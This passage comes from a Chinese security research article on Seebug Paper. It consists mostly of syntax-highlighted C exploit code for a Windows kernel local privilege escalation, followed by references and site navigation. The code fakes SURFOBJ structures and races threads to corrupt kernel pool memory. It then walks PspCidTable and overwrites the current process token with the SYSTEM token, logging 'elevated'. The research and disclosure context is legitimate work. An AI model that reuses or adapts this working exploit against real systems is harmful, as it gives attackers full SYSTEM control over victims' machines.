        <span class="n">th</span><span class="o">-&gt;</span><span class="n">backupBufferPtr2</span> <span class="o">=</span> <span class="n">victim_surf_obj</span> <span class="o">+</span> <span class="mh">0x200000</span> <span class="o">+</span> <span class="mh">0x258</span><span class="p">;</span>

        <span class="n">SIZE_T</span> <span class="n">back_offset</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>

        <span class="n">SURFOBJ</span> <span class="n">surf_obj</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>

        <span class="n">surf_obj</span><span class="p">.</span><span class="n">cjBits</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">pvBits</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">buffer_ptr</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">pvScan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">buffer_ptr</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">sizlBitmap</span><span class="p">.</span><span class="n">cx</span> <span class="o">=</span> <span class="mh">0x04</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">sizlBitmap</span><span class="p">.</span><span class="n">cy</span> <span class="o">=</span> <span class="mh">0x08</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">iBitmapFormat</span> <span class="o">=</span> <span class="mh">0x06</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">iType</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">fjBitmap</span> <span class="o">=</span> <span class="mh">0x01</span><span class="p">;</span>
        <span class="n">surf_obj</span><span class="p">.</span><span class="n">lDelta</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>

        <span class="n">DWORD</span> <span class="n">dwBuff</span> <span class="o">=</span> <span class="mh">0x04800200</span><span class="p">;</span>
        <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">surf_obj</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">);</span>
        <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0x70</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">DWORD</span><span class="p">));</span>


        <span class="k">if</span> <span class="p">(</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span> <span class="o">+</span> <span class="mh">0xE8</span> <span class="o">&lt;</span> <span class="mh">0x448</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">SIZE_T</span> <span class="n">qwBuff</span> <span class="o">=</span> <span class="n">victim_surf_obj</span> <span class="o">+</span> <span class="mh">0xE0</span><span class="p">;</span>
            <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0xE0</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">qwBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">));</span>
            <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0xE8</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">qwBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">));</span>
        <span class="p">}</span>


        <span class="k">if</span> <span class="p">(</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span> <span class="o">+</span> <span class="mh">0x1C0</span> <span class="o">&lt;</span> <span class="mh">0x448</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">SIZE_T</span> <span class="n">qwBuff</span> <span class="o">=</span> <span class="n">victim_surf_obj</span> <span class="o">+</span> <span class="mh">0x1B8</span><span class="p">;</span>
            <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0x1B8</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">qwBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">));</span>
            <span class="n">HtSetBuffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="mh">0x1C0</span> <span class="o">+</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">memberOffset</span> <span class="o">-</span> <span class="n">back_offset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">qwBuff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SIZE_T</span><span class="p">));</span>
        <span class="p">}</span>

        <span class="n">HtOverflowNextSListEntry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">,</span> <span class="n">victim_surf_obj</span><span class="p">);</span>
        <span class="n">HtTrigger</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ht</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">triggered</span><span class="p">)</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="n">VOID</span> <span class="nf">ThTrigger</span><span class="p">(</span><span class="n">THREAD_HOST</span> <span class="o">*</span> <span class="n">th</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">SIZE_T</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">HANDLE</span> <span class="n">threads</span><span class="p">[</span><span class="n">TH_MAX_THREADS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">second_buffer</span><span class="p">[</span><span class="mh">0x78</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">SIZE_T</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TH_MAX_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">triggered</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">9</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">thread_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ProbeThreadProc</span><span class="p">,</span> <span class="n">th</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thread_id</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mh">0x10</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">thread_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PresentThreadProc</span><span class="p">,</span> <span class="n">th</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thread_id</span><span class="p">);</span>
        <span class="p">}</span>           
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">DWORD</span> <span class="n">thread_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">BitbltThreadProc</span><span class="p">,</span> <span class="n">th</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thread_id</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">TH_MAX_THREADS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">WAIT_OBJECT_0</span> <span class="o">==</span> <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">INFINITE</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                <span class="n">threads</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">Log</span><span class="p">(</span><span class="s">&quot;trigged</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">backupBufferPtr2</span><span class="p">,</span> <span class="n">second_buffer</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">);</span>

    <span class="n">ADDR_RESOLVER</span> <span class="n">ar</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
    <span class="n">ArInitialize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">,</span> <span class="n">th</span><span class="p">);</span>

    <span class="n">SIZE_T</span> <span class="n">nt_addr</span> <span class="o">=</span> <span class="n">ArNTBase</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ar</span><span class="p">);</span> 
    <span class="n">SIZE_T</span> <span class="n">psp_cid_table_addr</span> <span class="o">=</span> <span class="n">nt_addr</span> <span class="o">+</span> <span class="n">PSP_CIDTABLE_OFFSET</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">psp_cid_table_value</span><span class="p">;</span>

    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="n">psp_cid_table_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">psp_cid_table_value</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>

    <span class="n">SIZE_T</span> <span class="n">psp_cid_table</span><span class="p">[</span><span class="mh">0x0C</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="n">psp_cid_table_value</span><span class="p">,</span> <span class="n">psp_cid_table</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">);</span>

    <span class="n">SIZE_T</span> <span class="n">table_code</span> <span class="o">=</span> <span class="n">psp_cid_table</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">SIZE_T</span> <span class="n">handle_count</span> <span class="o">=</span> <span class="n">psp_cid_table</span><span class="p">[</span><span class="mh">0x0B</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span>

    <span class="n">SIZE_T</span> <span class="n">curr_pid</span> <span class="o">=</span> <span class="n">GetCurrentProcessId</span><span class="p">();</span>

    <span class="k">do</span>
    <span class="p">{</span>
        <span class="n">ThParseCidTable</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="n">table_code</span><span class="p">,</span> <span class="n">handle_count</span><span class="p">);</span>
        <span class="n">Sleep</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">th</span><span class="o">-&gt;</span><span class="n">currentEprocess</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">systemEprocess</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">SIZE_T</span> <span class="n">curr_proc</span> <span class="o">=</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">currentEprocess</span><span class="p">;</span>
    <span class="n">SIZE_T</span> <span class="n">system_proc</span> <span class="o">=</span> <span class="n">th</span><span class="o">-&gt;</span><span class="n">systemEprocess</span><span class="p">;</span>

    <span class="n">SIZE_T</span> <span class="n">system_token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="p">(</span><span class="n">system_proc</span> <span class="o">+</span> <span class="mh">0x358</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">system_token</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>

    <span class="n">SIZE_T</span> <span class="n">curr_token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="p">(</span><span class="n">curr_proc</span> <span class="o">+</span> <span class="mh">0x358</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr_token</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>

    <span class="n">ThWrite</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="p">(</span><span class="n">curr_proc</span> <span class="o">+</span> <span class="mh">0x358</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">system_token</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>

    <span class="n">ThRead</span><span class="p">(</span><span class="n">th</span><span class="p">,</span> <span class="p">(</span><span class="n">curr_proc</span> <span class="o">+</span> <span class="mh">0x358</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">curr_token</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>

    <span class="n">ThRestore</span><span class="p">(</span><span class="n">th</span><span class="p">);</span>

    <span class="n">Log</span><span class="p">(</span><span class="s">&quot;elevated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">Sleep</span><span class="p">(</span><span class="mi">3600000</span><span class="p">);</span>

    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<h3>参考:</h3>
<ol>
<li><a href="https://ruxcon.org.au/assets/2016/slides/Rainbow_over_the_Windows.pdf">Rainbow Over the Windows</a></li>
<li><a href="https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf">Did You Get Your Token?</a></li>
<li><a href="http://www.slideshare.net/PeterHlavaty/windows-kernel-exploitation-this-time-font-hunt-you-down-in-4-bytes">Windows Kernel Exploitation : This Time Font hunt you down in 4 bytes</a></li>
<li><a href="https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf">Kernel Pool Exploitation on Windows 7</a></li>
</ol>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/117/">https://paper.seebug.org/117/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/116/"><span aria-hidden="true">&larr;</span> VBulletin 核心插件 forumrunner ...</a>
    
    
      <a class="older-posts" href="/118/">一个价值7500刀的CHROME UXSS（CVE-2... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
